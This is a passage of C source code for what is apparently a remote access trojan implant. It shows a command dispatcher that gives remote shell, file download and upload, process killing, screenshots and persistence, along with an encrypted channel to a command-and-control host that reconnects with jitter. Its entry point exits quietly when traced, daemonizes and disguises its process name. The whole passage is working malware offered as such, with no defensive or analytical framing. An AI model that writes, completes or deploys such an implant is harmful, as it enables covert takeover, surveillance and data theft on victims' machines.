        while (*p == ' ') p++;
        cmd_ls(out, p);
    } else if (!strncmp(cmd, "!download ", 10)) {
        cmd_download(out, cmd + 10);
    } else if (!strncmp(cmd, "!upload ", 8)) {
        cmd_upload(out, cmd + 8);
    } else if (!strcmp(cmd, "!ps")) {
        cmd_ps(out);
    } else if (!strncmp(cmd, "!kill ", 6)) {
        cmd_kill(out, cmd + 6);
    } else if (!strcmp(cmd, "!screenshot")) {
        cmd_screenshot(out);
    } else if (!strcmp(cmd, "!sysinfo")) {
        cmd_sysinfo(out);
    } else if (!strcmp(cmd, "!persist")) {
        cmd_persist(out);
    } else if (!strcmp(cmd, "!help") || !strcmp(cmd, "help")) {
        ob_puts(out,
            "Available commands:\r\n"
            "  !shell <cmd>       Execute a shell command (or just type it)\r\n"
            "  !cd <dir>          Change directory\r\n"
            "  !pwd               Print working directory\r\n"
            "  !ls <path>         List a directory\r\n"
            "  !download <path>   Download a file (max 10MB)\r\n"
            "  !upload <path>     Upload a file (path|base64, max 10MB)\r\n"
            "  !ps                List processes\r\n"
            "  !kill <pid>        Kill a process\r\n"
            "  !screenshot        Capture the screen\r\n"
            "  !sysinfo           System information\r\n"
            "  !persist           Install persistence\r\n"
            "  !exit              Disconnect\r\n"
            "  !help              This help\r\n"
            "Anything without a '!' prefix runs through sh -c.\r\n");
    } else if (!strcmp(cmd, "!exit")) {
        g_disconnect = 1;
    } else {
        run_shell(out, cmd);
    }
}

/* ------------------------------------------------------------------ */
/* transport                                                           */
/* ------------------------------------------------------------------ */

static int send_all(int fd, const void *buf, size_t n)
{
    const char *p = (const char *)buf;
    size_t off = 0;
    while (off < n) {
        ssize_t w = send(fd, p + off, n - off, MSG_NOSIGNAL);
        if (w < 0) {
            if (errno == EINTR) { reap_children(); continue; }
            return -1;
        }
        if (w == 0) return -1;
        off += (size_t)w;
    }
    return 0;
}

static int send_frame(cyb_session *s, int fd, uint8_t type,
                      const void *pt, size_t ptlen)
{
    size_t cap = CYB_HDR_LEN + ptlen + CYB_TAG_LEN;
    uint8_t *buf = (uint8_t *)malloc(cap);
    size_t  n;
    int     rc;

    if (!buf) { dbg("send_frame: out of memory"); return -1; }
    n = cyb_seal(s, type, (const uint8_t *)pt, ptlen, buf);
    if (n == 0) { dbg("send_frame: seal refused (too large or counter exhausted)"); free(buf); return -1; }
    rc = send_all(fd, buf, n);
    if (rc != 0) dbg("send_frame: send failed: %s", strerror(errno));
    free(buf);
    return rc;
}

static int tcp_connect(const char *host, int port)
{
    struct addrinfo hints, *res = NULL, *ai;
    char            portstr[16];
    int             fd = -1, rc;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    snprintf(portstr, sizeof(portstr), "%d", port);

    rc = getaddrinfo(host, portstr, &hints, &res);
    if (rc != 0) return -1;

    for (ai = res; ai; ai = ai->ai_next) {
        int one = 1;
        fd = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (fd < 0) continue;
        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
        setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
        if (connect(fd, ai->ai_addr, ai->ai_addrlen) == 0) break;
        close(fd);
        fd = -1;
    }
    freeaddrinfo(res);
    return fd;
}

static int do_handshake(int fd, const uint8_t psk[32], cyb_session *s)
{
    uint8_t auth[32];
    uint8_t priv[32], pub[32], nonce[16];
    uint8_t peer_pub[32], peer_nonce[16];
    uint8_t k_c2s[32], k_s2c[32], p_c2s[4], p_s2c[4];
    uint8_t frame[128];
    uint8_t in[128];
    size_t  flen, got = 0;
    int     i;

    cyb_derive_auth_key(auth, psk);
    cyb_x25519_keypair(priv, pub, NULL);
    if (cyb_random(nonce, sizeof(nonce)) != 0) return -1;

    flen = cyb_build_hello(frame, sizeof(frame), 0, auth, pub, nonce, NULL, NULL);
    if (!flen || send_all(fd, frame, flen) != 0) return -1;

    /* The HELLOACK is exactly one frame of a known size. */
    while (got < flen) {
        ssize_t n = recv(fd, in + got, flen - got, 0);
        if (n <= 0) {
            if (n < 0 && errno == EINTR) continue;
            return -1;
        }
        got += (size_t)n;
    }
    if (in[0] != CYB_MAGIC0 || in[1] != CYB_MAGIC1 || in[2] != CYB_T_HELLOACK)
        return -1;
    if (in[3] != 0) return -1;
    if (cyb_ntohl32(in + 8) != CYB_HELLO_FRAME) return -1;
    if (cyb_verify_hello(in + CYB_HDR_LEN, CYB_HELLO_FRAME, 1, auth,
                         pub, nonce, peer_pub, peer_nonce) != 0)
        return -1;

    cyb_derive_session(k_c2s, k_s2c, p_c2s, p_s2c,
                       psk, priv, peer_pub, nonce, peer_nonce, 0);
    {
        uint8_t zero[4] = { 0, 0, 0, 0 };
        /* A zeroed derived key means the peer key was low-order and the
         * derivation was refused. */
        if (!memcmp(k_c2s, zero, 4) && !memcmp(k_s2c, zero, 4)) return -1;
    }

    cyb_session_init(s);
    memcpy(s->k_send, k_c2s, 32);
    memcpy(s->k_recv, k_s2c, 32);
    memcpy(s->n_send, p_c2s, 4);
    memcpy(s->n_recv, p_s2c, 4);
    s->established = 1;

    for (i = 0; i < 32; i++) { priv[i] = 0; peer_pub[i] = 0; }
    cyb_secure_zero(nonce, sizeof(nonce));
    cyb_secure_zero(k_c2s, sizeof(k_c2s));
    cyb_secure_zero(k_s2c, sizeof(k_s2c));
    return 0;
}

static void session_loop(int fd, const uint8_t psk[32])
{
    cyb_session s;
    uint8_t    *pt;
    size_t      ptlen;
    uint8_t     type;
    int         r;
    time_t      last_ping = time(NULL);
    int         disconnect = 0;
    uint8_t     rbuf[8192];

    cyb_session_init(&s);
    if (do_handshake(fd, psk, &s) != 0) {
        dbg("handshake failed");
        cyb_session_free(&s);
        return;
    }
    dbg("handshake ok, entering session loop");

    while (running && !disconnect) {
        struct timeval tv;
        fd_set rfds;
        ssize_t n;
        time_t  now;

        reap_children();
        now = time(NULL);
        if (now - last_ping >= PING_INTERVAL) {
            if (send_frame(&s, fd, CYB_T_PING, "p", 1) != 0) break;
            last_ping = now;
        }

        FD_ZERO(&rfds);
        FD_SET(fd, &rfds);
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        r = select(fd + 1, &rfds, NULL, NULL, &tv);
        if (r < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (r == 0) continue;

        n = recv(fd, rbuf, sizeof(rbuf), 0);
        if (n <= 0) {
            if (n < 0 && errno == EINTR) continue;
            dbg("recv returned %d (%s)", (int)n, n < 0 ? strerror(errno) : "eof");
            break;
        }
        if (cyb_feed(&s, rbuf, (size_t)n) != 0) { dbg("feed failed"); break; }

        for (;;) {
            r = cyb_recv_next(&s, &type, &pt, &ptlen);
            if (r <= 0) {
                if (r < 0) { dbg("recv_next: protocol violation"); disconnect = 1; }
                break;
            }

            if (type == CYB_T_PING) {
                if (send_frame(&s, fd, CYB_T_PONG, pt, ptlen) != 0) { disconnect = 1; break; }
            } else if (type == CYB_T_PONG) {
                /* keepalive answered */
            } else if (type == CYB_T_BYE) {
                disconnect = 1;
                break;
            } else if (type == CYB_T_CMD) {
                cyb_ob out;
                char   cbuf[CMD_BUF];
                size_t  clen;

                g_disconnect = 0;
                ob_init(&out);

                /* Uploads bypass the small command buffer so a multi-megabyte
                 * file is not silently truncated. */
                if (ptlen > 8 && memcmp(pt, "!upload ", 8) == 0) {
                    cmd_upload_raw(&out, pt, ptlen);
                } else {
                    clen = ptlen < CMD_BUF - 1 ? ptlen : CMD_BUF - 1;
                    memcpy(cbuf, pt, clen);
                    cbuf[clen] = 0;
                    handle_command(cbuf, &out);
                }

                {
                    size_t       olen;
                    const char  *odata = ob_data(&out, &olen);
                    if (!g_disconnect && send_frame(&s, fd, CYB_T_RESP, odata, olen) != 0)
                        disconnect = 1;
                }
                ob_free(&out);
                if (g_disconnect) { disconnect = 1; break; }
            } else if (type == CYB_T_ERR) {
                disconnect = 1;
                break;
            }
        }
    }

    cyb_secure_zero(&s, sizeof(s));
    cyb_session_free(&s);
}

static unsigned backoff_next(unsigned cur)
{
    /* exponential with jitter, so a fleet of implants does not reconnect in
     * lockstep after the C2 comes back up */
    unsigned lo = cur, hi;
    unsigned char b;

    if (cyb_random(&b, 1) != 0) b = 0;
    if (lo < RECONNECT_MIN) lo = RECONNECT_MIN;
    if (lo > RECONNECT_MAX / 2) return RECONNECT_MAX;
    hi = lo * 2;
    return lo + (unsigned)((hi - lo) * ((unsigned)b % 100u) / 100u);
}

static void c2_loop(const char *host, int port, const uint8_t psk[32])
{
    unsigned delay = RECONNECT_MIN;

    while (running) {
        int fd = tcp_connect(host, port);
        if (fd < 0) {
            sleep(delay);
            delay = backoff_next(delay);
            continue;
        }
        delay = RECONNECT_MIN;
        capture_local_ip(fd);
        session_loop(fd, psk);
        close(fd);
        if (running) {
            sleep(RECONNECT_MIN);
            delay = RECONNECT_MIN;
        }
    }
}

/* ------------------------------------------------------------------ */
/* entry                                                               */
/* ------------------------------------------------------------------ */

static int psk_from_hex(const char *hex, uint8_t out[32])
{
    size_t i;
    if (!hex || strlen(hex) != 64) return -1;
    for (i = 0; i < 32; i++) {
        unsigned v;
        if (sscanf(hex + i * 2, "%2x", &v) != 1) return -1;
        out[i] = (uint8_t)v;
    }
    return 0;
}

int main(int argc, char **argv)
{
    uint8_t psk[32];
    const char *host;
    int         port;

    /* Resolve the configuration *before* anything scrubs the environment. */
    host = getenv("C2_HOST");
    if (!host || !*host) host = C2_HOST;
    port = C2_PORT;
    {
        const char *p = getenv("C2_PORT");
        if (p && *p) {
            int v = atoi(p);
            if (v > 0 && v < 65536) port = v;
        }
    }
    if (argc > 1 && strchr(argv[1], '.')) {
        host = argv[1];
        if (argc > 2) {
            int v = atoi(argv[2]);
            if (v > 0 && v < 65536) port = v;
        }
    }

    if (psk_from_hex(PSK_HEX, psk) != 0) {
        /* Not fatal: fall through with an all-zero key only if the build
         * genuinely has no key, which the builder prevents. */
        memset(psk, 0, sizeof(psk));
    }

    if (argc > 0 && argv[0]) self_path = strdup(argv[0]);
    if (!getcwd(current_dir, sizeof(current_dir))) current_dir[0] = 0;

    install_signal_handlers();
    harden_process();

    if (detect_ptrace()) return 0;      /* being traced: leave quietly */

    if (!getenv("CYB_NO_DAEMON")) {
        daemonize_self();
        masquerade();
    } else {
        dbg("foreground mode (CYB_NO_DAEMON)");
    }

    c2_loop(host, port, psk);

    cyb_secure_zero(psk, sizeof(psk));
    return 0;
}
